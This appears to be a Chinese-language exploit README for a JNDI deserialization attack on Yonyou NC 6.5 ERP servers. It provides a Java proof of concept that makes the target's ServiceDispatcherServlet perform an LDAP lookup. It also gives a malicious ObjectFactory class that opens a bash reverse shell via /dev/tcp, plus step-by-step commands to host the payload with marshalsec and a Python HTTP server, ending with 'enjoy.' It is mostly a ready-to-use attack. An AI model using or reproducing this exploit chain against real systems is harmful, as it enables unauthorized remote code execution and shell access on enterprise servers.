# 用友nc6.5反序列化依赖jar包

### 0x01：攻击java代码

```java
import nc.bs.framework.common.NCLocator;

import java.util.Properties;


public class poc {

    public static void attack(String url, String jndipath) {
        Properties env = new Properties();
        if (!url.startsWith("http")) {
            url = "http://" + url;
        }
        env.put("SERVICEDISPATCH_URL", url + "/ServiceDispatcherServlet");
        NCLocator locator = NCLocator.getInstance(env);
        locator.lookup(jndipath);
    }

    public static void main(String[] args) {
        attack("http://192.168.1.1:81", "ldap://192.168.1.2:1099/remote");
    }
}
```
运行起来主要报`classNotFound`，必需第三方jar包如下：

- ncdepend.jar
- log4j-1.2.15.jar
- log.jar

### 0x02：远程利用java恶意代码

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.Serializable;
import java.util.Hashtable;

public class remote implements ObjectFactory, Serializable {

    public remote() {
        try{
            java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","sh -i >& /dev/tcp/ip/port 0>&1"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
```

### 0x03：使用方法

- jetbrains IDEA ：`file -> New -> Project -> Java`
	- *[点击以了解IDEA运行JAVA项目DEMO](https://blog.csdn.net/oschina_41790905/article/details/79475187)*
	- `src目录 -> New -> Java Class -> poc.java`即可；
	- `Project Structure -> Librabries -> + `添加lib文件夹即可；  
	
- 恶意LDAP：`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.2:8000/#remote" 1099`
    - *[点击以了解marshalsec](https://github.com/mbechler/marshalsec)*
- HTTP SERVER(remote.class)：`python3 -m http.server`

- 填入主方法下`attck url & jndipath` -> `run poc.main()`即可。

- enjoy.

### 0x04：参考链接

- [用友NC反序列化 简单分析](https://blog.sari3l.com/posts/608d18f0/#jwdp)
- [用友nc6.5详细安装过程](https://blog.csdn.net/weixin_38766356/article/details/103983787)
